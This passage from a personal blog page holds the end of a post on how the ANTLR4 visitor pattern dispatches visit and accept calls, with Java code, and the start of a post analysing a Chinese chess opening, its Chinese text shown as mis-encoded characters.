<p>çœŸæ­£çš„è®¿é—®åè®®éœ€è¦ç¨‹åºå‘˜æ’°å†™, ç»§æ‰¿<code>DrawGraphBaseVisitor</code>é‡å†™åŒåå‡½æ•°</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvalVisitor</span> <span class="keyword">extends</span> <span class="title class_">DrawGraphBaseVisitor</span>&lt;Double&gt;</span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">	<span class="meta">@Override</span> <span class="keyword">public</span> Double <span class="title function_">visitStatScale</span><span class="params">(DrawGraphParser.StatScaleContext ctx)</span> &#123;	<span class="comment">//é‡å†™visitStatScaleå‡½æ•°</span></span><br><span class="line">	    scaleX = visit( ctx.expr(<span class="number">0</span>) );		<span class="comment">//0ä¸‹æ ‡çš„å­èŠ‚ç‚¹</span></span><br><span class="line">	    scaleY = visit( ctx.expr(<span class="number">1</span>) );		<span class="comment">//1ä¸‹è¡¨çš„å­èŠ‚ç‚¹</span></span><br><span class="line">	    <span class="keyword">return</span> <span class="number">0.0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="è®¿é—®è€…æ§åˆ¶æµ"><a href="#è®¿é—®è€…æ§åˆ¶æµ" class="headerlink" title="è®¿é—®è€…æ§åˆ¶æµ"></a>è®¿é—®è€…æ§åˆ¶æµ</h5><p>ä¸‹é¢è·Ÿéšè®¿é—®è€…çš„æ§åˆ¶æµ, çœ‹ä¸€ä¸‹acceptå’Œvisitæ˜¯å¦‚ä½•é…åˆçš„</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//BackEndå…¥å£:</span></span><br><span class="line"><span class="type">EvalVisitor</span> <span class="variable">eval</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">EvalVisitor</span>();</span><br><span class="line">eval.visit(tree);		<span class="comment">//è¿™é‡Œtreeå°±æ˜¯è¯­æ³•æ ‘çš„æ ‘æ ¹èŠ‚ç‚¹, ä¹Ÿå°±æ˜¯ä¸€ä¸ªprogramContextèŠ‚ç‚¹ç±»</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//in class AbstractParseTreeVisitor</span></span><br><span class="line">	<span class="keyword">public</span> T <span class="title function_">visit</span><span class="params">(ParseTree tree)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> tree.accept(<span class="built_in">this</span>);			<span class="comment">//å¤šæ€è°ƒç”¨äº†programContext.accept()</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// in class ProgramContext</span></span><br><span class="line">    <span class="keyword">public</span> &lt;T&gt; T <span class="title function_">accept</span><span class="params">(ParseTreeVisitor&lt;? extends T&gt; visitor)</span> &#123;</span><br><span class="line">        <span class="comment">//EvalVisitorç±»æ²¡æœ‰é‡å†™visitProgram()æ–¹æ³•, å› æ­¤è°ƒç”¨äº†DrawGraphBaseVisitor.visitProgram()</span></span><br><span class="line">        <span class="keyword">if</span> ( visitor <span class="keyword">instanceof</span> DrawGraphVisitor ) <span class="keyword">return</span> ((DrawGraphVisitor&lt;? <span class="keyword">extends</span> <span class="title class_">T</span>&gt;)visitor).visitProgram(<span class="built_in">this</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> visitor.visitChildren(<span class="built_in">this</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//in class DrawGraphBaseVisitor</span></span><br><span class="line">	<span class="meta">@Override</span> <span class="keyword">public</span> T <span class="title function_">visitProgram</span><span class="params">(DrawGraphParser.ProgramContext ctx)</span> &#123; <span class="keyword">return</span> visitChildren(ctx); &#125;</span><br><span class="line">	<span class="comment">//programContextå®é™…ä¸Šå°±æ˜¯ä¸€ä¸ªstatementContextæ•°ç»„, å› æ­¤ä¸éœ€è¦ç‰¹æ®Šæ“ä½œ, ç›´æ¥ç‹¬ç«‹åœ°è®¿é—®å­èŠ‚ç‚¹statementContextå³å¯</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//in class AbstractParseTreeVisitor</span></span><br><span class="line">    <span class="keyword">public</span> T <span class="title function_">visitChildren</span><span class="params">(RuleNode node)</span> &#123;</span><br><span class="line">        <span class="type">T</span> <span class="variable">result</span> <span class="operator">=</span> <span class="built_in">this</span>.defaultResult();</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> node.getChildCount();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n &amp;&amp; <span class="built_in">this</span>.shouldVisitNextChild(node, result); ++i) &#123;</span><br><span class="line">            <span class="type">ParseTree</span> <span class="variable">c</span> <span class="operator">=</span> node.getChild(i);</span><br><span class="line">            <span class="type">T</span> <span class="variable">childResult</span> <span class="operator">=</span> c.accept(<span class="built_in">this</span>);		<span class="comment">//éå†æ¯ä¸ªå­èŠ‚ç‚¹, è°ƒç”¨å…¶acceptæ–¹æ³•</span></span><br><span class="line">            result = <span class="built_in">this</span>.aggregateResult(result, childResult);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>åˆ°æ­¤ç¨‹åºæ§åˆ¶æµåˆè¿›å…¥äº†<code>accept</code>æ–¹æ³•ä¸­, åªä¸è¿‡è¿™æ¬¡åº”è¯¥æ˜¯<code>StatementContext.accept</code>æ–¹æ³•</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//in class StatementContext</span></span><br><span class="line">		<span class="keyword">public</span> &lt;T&gt; T <span class="title function_">accept</span><span class="params">(ParseTreeVisitor&lt;? extends T&gt; visitor)</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> ( visitor <span class="keyword">instanceof</span> DrawGraphVisitor ) <span class="keyword">return</span> ((DrawGraphVisitor&lt;? <span class="keyword">extends</span> <span class="title class_">T</span>&gt;)visitor).visitStatement(<span class="built_in">this</span>);</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">return</span> visitor.visitChildren(<span class="built_in">this</span>);</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>

<p>â€¦</p>
<p>ä¹Ÿå°±æ˜¯è¯´åœ¨å…·ä½“çš„è®¿é—®åè®®, æ¯”å¦‚<code>visitStatement</code>æˆ–è€…<code>visitStatScale</code>ç­‰ç­‰, å¦‚æœç¨‹åºå‘˜æœ‰åœ¨<code>EvalVisitor</code>ä¸­é‡å†™, åˆ™è°ƒç”¨ç¨‹åºå‘˜è‡ªå®šä¹‰çš„</p>
<p>å¦åˆ™è°ƒç”¨<code>antlr4</code>åœ¨<code>DrawGraphBaseVisitor</code>ä¸­ç”Ÿæˆçš„é»˜è®¤çš„</p>
<h5 id="è®¿é—®å™¨æ¨¡å¼æ€»ç»“"><a href="#è®¿é—®å™¨æ¨¡å¼æ€»ç»“" class="headerlink" title="è®¿é—®å™¨æ¨¡å¼æ€»ç»“"></a>è®¿é—®å™¨æ¨¡å¼æ€»ç»“</h5><p>1.è®¿é—®è€…ç±»çš„visitæ¥å£, ç”¨äºä¸è¯­æ³•æ ‘èŠ‚ç‚¹ç±»acceptæ¥å£å»ºç«‹è¿æ¥, åå•†é’ˆå¯¹è¯¥èŠ‚ç‚¹çš„å…·ä½“è®¿é—®åè®®</p>
<p>2.è®¿é—®è€…ç±»è¦çŸ¥é“æ‰€æœ‰å¯èƒ½çš„è¯­æ³•æ ‘èŠ‚ç‚¹ç±»å‹, å¹¶å®ç°æ‰€æœ‰å…·ä½“çš„è®¿é—®åè®®</p>
<p>3.è¯­æ³•æ ‘çš„èŠ‚ç‚¹ç±»è¦å®ç°acceptæ¥å£, ç”¨äºä¸è®¿é—®è€…çš„visitæ¥å£åå•†æœ¬èŠ‚ç‚¹çš„å…·ä½“è®¿é—®åè®®, å‘ŠçŸ¥è®¿é—®è€…æœ¬èŠ‚ç‚¹çš„å…·ä½“ç±»å‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">visitor.visit(node)</span><br><span class="line">	=&gt; node.accept(visitor)</span><br><span class="line">		=&gt; visitor.visitConcrete1(node)</span><br></pre></td></tr></table></figure>



<h3 id="è®¾è®¡æ¨¡å¼å…³ç³»"><a href="#è®¾è®¡æ¨¡å¼å…³ç³»" class="headerlink" title="è®¾è®¡æ¨¡å¼å…³ç³»"></a>è®¾è®¡æ¨¡å¼å…³ç³»</h3><p>å›¾ç‰‡æ¥è‡ªèœé¸Ÿæ•™ç¨‹</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/mmexport1707099938077.png" alt="è®¾è®¡æ¨¡å¼ä¹‹é—´çš„å…³ç³»"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2025/04/11/[%E7%96%91%E5%BD%A2%E6%8E%A8%E6%BC%94]%20%E4%B8%AD%E7%82%AE%E8%BF%87%E6%B2%B3%E8%BD%A6%E4%BA%92%E8%BF%9B%E4%B8%83%E5%85%B5%E5%AF%B9%E5%B1%8F%E9%A3%8E%E9%A9%AC%E5%B7%A6%E9%A9%AC%E7%9B%98%E6%B2%B3%20-%20%E7%BA%A2%E4%B8%83%E8%B7%AF%E9%A9%AC/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/04/11/%5B%E7%96%91%E5%BD%A2%E6%8E%A8%E6%BC%94%5D%20%E4%B8%AD%E7%82%AE%E8%BF%87%E6%B2%B3%E8%BD%A6%E4%BA%92%E8%BF%9B%E4%B8%83%E5%85%B5%E5%AF%B9%E5%B1%8F%E9%A3%8E%E9%A9%AC%E5%B7%A6%E9%A9%AC%E7%9B%98%E6%B2%B3%20-%20%E7%BA%A2%E4%B8%83%E8%B7%AF%E9%A9%AC/" class="post-title-link" itemprop="url">ä¸­ç‚®è¿‡æ²³è½¦äº’è¿›ä¸ƒå…µå¯¹å±é£é©¬å·¦é©¬ç›˜æ²³  çº¢ä¸ƒè·¯é©¬ é»‘ç›˜æ²³é©¬è¸©ä¸‰å…µ ç–‘å½¢æ¨æ¼”</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2025-04-11 03:10:00 / Modified: 04:00:32" itemprop="dateCreated datePublished" datetime="2025-04-11T03:10:00+08:00">2025-04-11</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="ç–‘å½¢æ¨æ¼”-ä¸­ç‚®è¿‡æ²³è½¦äº’è¿›ä¸ƒå…µå¯¹å±é£é©¬å·¦é©¬ç›˜æ²³-çº¢ä¸ƒè·¯é©¬-é»‘ç›˜æ²³é©¬è¸©ä¸‰å…µ"><a href="#ç–‘å½¢æ¨æ¼”-ä¸­ç‚®è¿‡æ²³è½¦äº’è¿›ä¸ƒå…µå¯¹å±é£é©¬å·¦é©¬ç›˜æ²³-çº¢ä¸ƒè·¯é©¬-é»‘ç›˜æ²³é©¬è¸©ä¸‰å…µ" class="headerlink" title="[ç–‘å½¢æ¨æ¼”] ä¸­ç‚®è¿‡æ²³è½¦äº’è¿›ä¸ƒå…µå¯¹å±é£é©¬å·¦é©¬ç›˜æ²³ - çº¢ä¸ƒè·¯é©¬ é»‘ç›˜æ²³é©¬è¸©ä¸‰å…µ"></a>[ç–‘å½¢æ¨æ¼”] ä¸­ç‚®è¿‡æ²³è½¦äº’è¿›ä¸ƒå…µå¯¹å±é£é©¬å·¦é©¬ç›˜æ²³ - çº¢ä¸ƒè·¯é©¬ é»‘ç›˜æ²³é©¬è¸©ä¸‰å…µ</h1><h2 id="å¯¹å±€è®°å½•"><a href="#å¯¹å±€è®°å½•" class="headerlink" title="å¯¹å±€è®°å½•"></a>å¯¹å±€è®°å½•</h2><ol>
<li><p>ç‚®äºŒå¹³äº” é©¬ï¼˜è¿›ï¼—</p>
</li>
<li><p>é©¬äºŒè¿›ä¸‰ å’ï¼—è¿›ï¼‘</p>
</li>
<li><p>è½¦ä¸€å¹³äºŒ è½¦ï¼™å¹³ï¼˜</p>
</li>
<li><p>è½¦äºŒè¿›å…­ é©¬ï¼’è¿›ï¼“</p>
</li>
<li><p>å…µä¸ƒè¿›ä¸€ é©¬ï¼—è¿›ï¼–</p>
</li>
<li><p>é©¬å…«è¿›ä¸ƒ é©¬ï¼–è¿›ï¼— ï¼Ÿ</p>
</li>
<li><p>ç‚®å…«è¿›å›› è±¡ï¼—è¿›ï¼• ï¼Ÿ</p>
</li>
<li><p>ç‚®äº”è¿›å›› å£« 4 è¿› 5  ï¼Ÿ</p>
</li>
</ol>
<h2 id="å¤ç›˜åˆ†æ"><a href="#å¤ç›˜åˆ†æ" class="headerlink" title="å¤ç›˜åˆ†æ"></a>å¤ç›˜åˆ†æ</h2><ol>
<li>ç‚®äºŒå¹³äº” é©¬ï¼˜è¿›ï¼—</li>
<li>é©¬äºŒè¿›ä¸‰ å’ï¼—è¿›ï¼‘</li>
<li>è½¦ä¸€å¹³äºŒ è½¦ï¼™å¹³ï¼˜</li>
<li>è½¦äºŒè¿›å…­ é©¬ï¼’è¿›ï¼“</li>
<li>å…µä¸ƒè¿›ä¸€ é©¬ï¼—è¿›ï¼–</li>
<li>é©¬å…«è¿›ä¸ƒ â€¦</li>
</ol>
<blockquote>
<p>åˆ°æ­¤åŒæ–¹èµ°çš„éƒ½æ˜¯æ­£ç€ï¼Œå½¢æˆäº†ä¸­ç‚®è¿‡æ²³è½¦äº’è¿›ä¸ƒå…µå¯¹å±é£é©¬å·¦é©¬ç›˜æ²³ - çº¢ä¸ƒè·¯é©¬ å±€é¢</p>
<p>æ­¤æ—¶é»‘æ–¹åº”è¯¥é£è±¡3è¿›5ç­‰ä¸€æ‰‹ï¼Œ</p>
</blockquote>
<ol start="6">
<li>é©¬å…«è¿›ä¸ƒ é©¬ï¼–è¿›ï¼—</li>
</ol>
<blockquote>
<p>é»‘ç›˜æ²³é©¬å…ˆè¸©çº¢ä¸‰å…µå¾—ä¸€ä¸ªå®æƒ ï¼Œç„¶è€Œä¹Ÿå°±å¤±å»äº†å†²7å’è¸©çº¢è½¦çš„åå‡»ï¼Œé»‘å·¦è·¯ç•™ä¸‹äº†æ— æ ¹è½¦ç‚®è¢«ç‰µåˆ¶ã€‚</p>
<p>å¹¶ä¸”æ­¤æ—¶é»‘æ–¹ä¸­è·¯ç©ºè™šï¼Œ çº¢æ–¹ç«‹åˆ»è¿›æ”»é»‘æ–¹ä¸­è·¯ã€‚æœ‰ï¼ˆ1ï¼‰ç‚®å…«è¿›å›› ï¼ˆ2ï¼‰é©¬ä¸ƒè¿›å…­ï¼ˆ3ï¼‰å…µäº”è¿›ä¸€ ä¸‰ç§èµ°æ³•</p>
<p>ï¼ˆ1ï¼‰ç‚®å…«è¿›å››</p>
<img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250410222650589.png" alt="image-20250410222650589" style="zoom:50%;" />

<p>çº¢æ–¹çš„ç›®çš„æ˜¯ç»™é»‘æ–¹æ‰“ç©ºå¤´ç‚®ï¼Œ æ­¤æ—¶é»‘æ–¹3å’å’Œ5å’éƒ½æŒºä¸èµ·æ¥ã€‚</p>
<p>é»‘æ–¹åº”é©¬7è¿›5æ¢æ‰çº¢ä¸­ç‚®ï¼Œå¦‚æ­¤çº¢æ–¹ä¸­è·¯æ”»åŠ¿é”å‡ã€‚æ­¤åçš„å˜åŒ–ï¼š</p>
<ol start="7">
<li><p>ç‚®å…«è¿›å›› é©¬7è¿›5</p>
</li>
<li><p>è±¡ä¸ƒè¿›äº” è±¡7è¿›5 ï¼ˆæˆ–è€…è½¦1è¿›1ï¼ŒåŒºåˆ«ä¸æ˜¯å¾ˆå¤§ï¼Œé»‘å…ˆå‡ºè½¦å¹¶ä¸ä¼šå¾—åˆ°ä»€ä¹ˆå…ˆæ‰‹ï¼‰</p>
</li>
</ol>
<img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250410224605022.png" alt="image-20250410224605022" style="zoom:50%;" />

<p>æ­¤å±€é¢ä¸‹é»‘æ–¹å³é©¬çœ‹ä¼¼æœ‰å·¦ç‚®ä¸ºæ ¹ï¼Œä½†æ˜¯å·¦ç‚®åé¢æ‹‰ç€è½¦ï¼Œæ˜¯ä¸ªå“‘ç‚®ã€‚</p>
<p>å› æ­¤çº¢æ–¹çš„è¿›æ”»çŸ›å¤´å°±æ˜¯é»‘å³é©¬ï¼Œå¦‚ä½•è¿›æ”»é»‘å³é©¬ï¼Ÿå¦‚æœçº¢é©¬èƒ½è¸©è¸é»‘ä¸­å’ï¼Œå°±å¯ä»¥æ‰“åˆ°é»‘é©¬ã€‚</p>
<p>å› æ­¤æ¥ä¸‹æ¥çº¢é©¬ä¸‰è¿›å››ï¼Œé©¬ä¸ƒè¿›å…­ç›´å–é»‘ä¸­è·¯</p>
<ol start="9">
<li><p>é©¬ä¸‰è¿›å›› è½¦1è¿›1</p>
</li>
<li><p>é©¬å››è¿›äº” â€¦</p>
</li>
</ol>
<img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250410224742766.png" alt="image-20250410224742766" style="zoom:50%;" />

<p>æ­¤å±€é¢ä¸‹é»‘å³é©¬å—æ”»ï¼Œé»‘æ–¹åº”æ³•æœ‰é©¬3è¿›5&#x2F;è½¦1å¹³3&#x2F;è½¦1å¹³8</p>
<p><strong>&lt;1&gt;</strong> å¦‚æœé»‘èµ°ğŸ3è¿›5ï¼š</p>
<ol start="10">
<li><p>é©¬å››è¿›äº” é©¬3è¿›5</p>
</li>
<li><p>ç‚®å…«å¹³äº” å£«4è¿›5ï¼Œ æ­¤å¤„é»‘è¡¥èŠ±å£«è±¡æ¯”è¾ƒå¥½ï¼Œå¦åˆ™å·¦ä¾§å¤ªç©ºäº†</p>
</li>
</ol>
<p>æ­¤å±€é¢ä¸‹çº¢æ–¹çš„è¿›æ”»æ€è·¯æœ‰ä¸¤ç§ï¼š</p>
<img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250410230214598.png" alt="image-20250410230214598" style="zoom: 50%;" />

<p>I.âš¡å…¶ä¸€æ˜¯å‡ºå·¦ç›´è½¦å…ˆæ‰‹æŠ“ç‚®ï¼Œç„¶åè¿›åˆ°å’æ—å‡†å¤‡æ€3å’ï¼Œå¯¹é»‘åº•è±¡æ–½åŠ å‹åŠ›ã€‚</p>
<p>å¦‚æœé»‘æ–¹èº²2è·¯ç‚®åˆ™çº¢æ–¹ç«‹åˆ»æ²‰åº•è½¦ï¼Œå…ˆæ‰‹å«é“é—¨æ “ï¼Œ</p>
<p>é»‘æ–¹è¦ä¹ˆå‡ºå°†ï¼Œè¦ä¹ˆè½¦1å¹³3æ­»å®ˆï¼Œ</p>
<p>çº¢é©¬é—²åº­ä¿¡æ­¥ä¸Šå°±å®Œäº†ï¼Œç›®æ ‡é»‘ä¸­è±¡</p>
<img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250410231222464.png" alt="é»‘å¹³2ç‚®ï¼Œçº¢æ²‰åº•è½¦" style="zoom: 67%;" />

<p>å› æ­¤æ­¤å¤„é»‘æ–¹æ­£æ‰‹æ˜¯è½¦8å¹³7ï¼Œä¸èƒ½èº²ç‚®ã€‚</p>
<p>é‚£ä¹ˆçº¢è¿˜æ˜¯ä¸¤æ¡è·¯çº¿ï¼Œè¦ä¹ˆè½¦å…«è¿›å…­å†å¹³ä¸ƒï¼Œè¦ä¹ˆå°±å†²ä¸­å…µç¼“è¿›ã€‚</p>
<p>II. ğŸŒå…¶äºŒæ˜¯å†²ä¸­å…µï¼Œç›˜ä¸­é©¬ï¼Œ å¾å›¾è¿›å±•</p>
<p>III. ğŸ’€åƒä¸‡ä¸å¯é©¬ä¸ƒè¿›å…­ï¼Œä¼šé­åˆ°é»‘è½¦1å¹³4åå‡»ï¼Œæ­¤æ—¶çº¢é©¬æ²¡æœ‰å¥½å»å¤„ï¼Œæ›´ä¸å¯å†²åŠ¨è¸©3å’ï¼Œé»‘å¯ä»¥ç«‹åˆ»è½¦4è¿›2ç„¶åç‚®2è¿›1ç¡¬åƒçº¢ä¸­ç‚®ï¼Œçº¢æ–¹ç«‹åˆ»å´©ç›˜</p>
<p>**&lt;2&gt;**å¦‚æœé»‘èµ°ğŸš—1å¹³3</p>
<ol start="10">
<li>é©¬å››è¿›äº” è½¦1å¹³3</li>
</ol>
<p>æ­¤æ—¶çº¢æ–¹æœ‰å¤šç§èµ°æ³•ï¼Œä¸€æ˜¯é©¬äº”è¿›ä¸‰æ¢é©¬ï¼ŒäºŒæ˜¯ä¸æ€¥ç€æ¢é©¬ã€‚<br>æ¢é©¬å¹¶ä¸å¥½ï¼Œé»‘æ–¹åœ¨3è·¯è½¦å’é…åˆä¸‹æœ‰åå‡»ï¼Œçº¢æ–¹éœ€è¦å†²ä¸­å…µç›˜ä¸­é©¬é˜²å¾¡</p>
<img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250410234145196.png" alt="image-20250410234145196" style="zoom:50%;" />

<p>æ­¤æ—¶çº¢æ–¹åº”è¯¥ä¸äºˆç†ç¬ï¼Œå†²ä¸­å…µæˆ–è€…è¿›å·¦é©¬ç›˜æ²³æˆ–è€…å‡ºå·¦æ¨ªè½¦å‡å¯ä»¥ã€‚<br>â€‹ä½†æ˜¯å‡ºå·¦è¾¹è½¦é©¬æ²¡æœ‰æ˜ç¡®æ‰“å‡»ç›®æ ‡ï¼Œä¸å¦‚å†²ä¸­å…µå¾å›¾è¿›å±•ã€‚</p>
<img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250410234625162.png" alt="image-20250410234625162" style="zoom:50%;" />

<p><strong>&lt;3&gt;</strong> å¦‚æœé»‘èµ°ğŸš—1å¹³8</p>
<p>é»‘æ–¹çš„ç›®çš„æ˜¯ç”¨éœ¸ç‹è½¦è§£å†³å·¦ç¿¼æ— æ ¹è½¦ç‚®é—®é¢˜ï¼Œæ˜¾ç„¶å¦‚æœé»‘æ–¹è§£å¼€äº†å¯¹çº¢æ–¹ä¸åˆ©</p>
<ol start="10">
<li><p>é©¬å››è¿›äº” è½¦1å¹³8</p>
</li>
<li><p>é©¬äº”è¿›ä¸‰ å‰è½¦å¹³7</p>
</li>
<li><p>é©¬ä¸‰é€€å››</p>
</li>
</ol>
<p>çº¢æ–¹æˆåŠŸéªšæ‰°é»‘æ–¹çš„éœ¸ç‹è½¦è®¡åˆ’ï¼Œè°ƒæ•´é©¬ä½å‡†å¤‡è¿›å…­ï¼Œæ¥ä¸‹æ¥æœ‰æŒ‚è§’å’Œç„2è·¯ç‚®è¿‡ä¸ƒå…µä¸¤ä¸ªè¿›æ”»çŸ›å¤´ã€‚</p>
<img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411000125937.png" alt="image-20250411000125937" style="zoom:50%;" />

<p>ï¼ˆ1ï¼‰é»‘æ–¹å¦‚æœæ‰§æ„è¦èµ°éœ¸ç‹è½¦ï¼Œè½¦8è¿›1</p>
<p>çº¢é©¬å››è¿›å…­ï¼Œå‡†å¤‡æŒ‚è§’æŠ½è½¦ï¼ŒåŒæ—¶çº¢é©¬çªç€é»‘2è·¯ç‚®ï¼Œçº¢ä¸ƒå…µæ¸¡æ²³æ—¶æœºå·²åˆ°<br>æ­¤æ—¶é»‘æ–¹åªæœ‰è½è±¡æ‰èƒ½åŒæ—¶è§£å†³ä¸¤ä¸ªé—®é¢˜<br>çº¢ç‚®å…«é€€ä¸€ï¼Œå‡†å¤‡å†å¹³äº”ç«‹ç©ºå¤´ç‚®.<br>ç”±äºçº¢é©¬éšæ—¶æŒ‚è§’æŠ½è½¦ï¼Œé»‘æ–¹å³ç‚®å¿…é¡»é˜²å®ˆä½æŒ‚è§’ç‚¹ï¼Œå› æ­¤é»‘æ— æ³•è¡¥ä¸­è±¡<br>åˆ°æ­¤é»‘æ–¹å·²ç»æ— åŠ›æŠµæŠ—äº†</p>
<img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411000652703.png" alt="image-20250411000652703" style="zoom:50%;" />

<p>ï¼ˆ2ï¼‰é»‘æ–¹æ²¡æœ‰æ¯”è¾ƒå¥½çš„èµ°æ³•ï¼Œåªèƒ½èµ°è½¦7å¹³6.</p>
<p>çº¢é©¬å››è¿›å…­ï¼Œè¿˜æ˜¯è¦è¿‡ä¸ƒå…µ<br>é»‘åªèƒ½ç‚®2é€€1æˆ–è€…é€€2<br>æ…¢æ…¢å†²ä¸­å…µå°±å¯ä»¥äº†</p>
<p>å¦‚æœåœ¨ç¬¬7å›åˆé»‘é©¬æ²¡æœ‰æ¢æ‰çº¢ä¸­ç‚®ï¼Œä¹Ÿå°±æ˜¯å®æˆ˜é»‘çš„èµ°æ³•ã€‚</p>
</blockquote>
<blockquote>
<p>ï¼ˆ2ï¼‰é©¬ä¸ƒè¿›å…­</p>
<ol start="7">
<li>é©¬ä¸ƒè¿›å…­ è½¦1è¿›1 ï¼Œè¿™é‡Œé»‘æ–¹å¹¶æ²¡æœ‰ç«‹åˆ»è¡¥è±¡ï¼Œå‹¾å¼•çº¢æ–¹ç«‹åˆ»è¿›æ”»</li>
</ol>
<p>æ­¤æ—¶çº¢æ²³å£é©¬ï¼Œä¸­ç‚®ï¼Œå³è½¦å¯¹é»‘ä¸­å’è™è§†çœˆçœˆï¼Œä½†æ˜¯é»‘ä¸­å’åªæœ‰ä¸€æ‰¹å³é©¬é˜²å¾¡ï¼ŒåŠ¿å•åŠ›è–„ã€‚</p>
<p>I. çº¢æ–¹æƒ³ç«‹åˆ»é©¬å…­è¿›äº”ï¼Œç­‰é»‘é©¬3è¿›5æ¢é©¬ï¼Œçº¢ç‚®äº”è¿›å››ç«‹ä¸Šç©ºå¤´ç‚®ã€‚</p>
<img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411002210999.png" alt="image-20250411002210999" style="zoom:50%;" />

<p>ç„¶è€Œè¿™åªæ˜¯çº¢æ–¹ä¸€å¢æƒ…æ„¿</p>
<p>å½“çº¢é©¬å››è¿›äº”åï¼Œé»‘é©¬7è¿›5ï¼ŒæŠŠçº¢æœ€å…·æœ‰å¨èƒçš„ä¸­ç‚®æ¢æ‰ï¼Œå¦‚æœçº¢æ–¹ä¸ç†ç¬é»‘é©¬ï¼Œåˆ™é©¬5è¿›3å§æ§½æŠ½è½¦ã€‚å› æ­¤çº¢å¿…é¡»é£è±¡åƒé©¬ï¼Œæ­¤æ—¶é»‘é©¬3è¿›5æ¢é©¬ï¼Œçº¢è½¦äºŒå¹³äº”æ¢é©¬ã€‚</p>
<p>é»‘æ–¹é¡ºåŠ¿ç‚®8å¹³5è¿˜æ¶ä¸­ç‚®ï¼Œè§£å†³äº†å·¦è·¯æ— æ ¹è½¦ç‚®é—®é¢˜ã€‚åŒæ–¹åŠ¿å‡åŠ›æ•Œï¼Œé»‘æ–¹è¶³ä»¥æ»¡æ„ã€‚</p>
<img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411002629216.png" alt="image-20250411002629216" style="zoom:50%;" />

